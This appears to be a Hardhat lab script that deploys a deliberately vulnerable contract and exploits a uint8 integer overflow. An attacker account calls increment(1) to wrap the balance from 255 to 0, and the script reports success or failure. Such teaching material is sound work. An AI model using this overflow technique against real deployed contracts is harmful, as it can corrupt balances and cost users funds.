const { ethers } = require("hardhat");

async function main() {
  console.log(
    "🚀 Initiating attack on SC08_IntegerOverflowAndUnderflow_Vulnerable..."
  );

  // --- 1. GET THE SIGNERS ---
  const [deployer, attacker] = await ethers.getSigners();

  console.log(`Deployer Address: ${deployer.address}`);
  console.log(`Attacker Address: ${attacker.address}`);

  // --- 2. DEPLOY THE CONTRACT ---
  console.log("\nDeploying contract...");
  const SC08 = await ethers.getContractFactory(
    "SC08_IntegerOverflowAndUnderflow_Vulnerable"
  );
  const vulnerableContract = await SC08.deploy();
  await vulnerableContract.waitForDeployment();
  const vulnerableContractAddress = vulnerableContract.target;
  console.log(`\n🎯 Target Contract Address: ${vulnerableContractAddress}`);

  // --- 3. EXECUTE THE ATTACK ---
  console.log("\n💰 Checking balance before the attack...");
  let currentBalance = await vulnerableContract.getBalance();
  console.log(`   - Initial balance: ${currentBalance}`);

  console.log("\n💥 ATTACKING: Triggering an integer overflow...");
  // The balance is a uint8, max value 255. Adding 1 will cause it to overflow and wrap around to 0.
  const tx = await vulnerableContract.connect(attacker).increment(1);
  await tx.wait();
  console.log("✅ Attack transaction successful!");

  console.log("\n💰 Checking balance after the attack...");
  currentBalance = await vulnerableContract.getBalance();
  console.log(`   - Balance after overflow: ${currentBalance}`);

  if (currentBalance < 255) {
    console.log("\n🎉 SUCCESS: The integer overflow was successful!");
  } else {
    console.log("\n😞 FAILED: The integer overflow did not occur as expected.");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
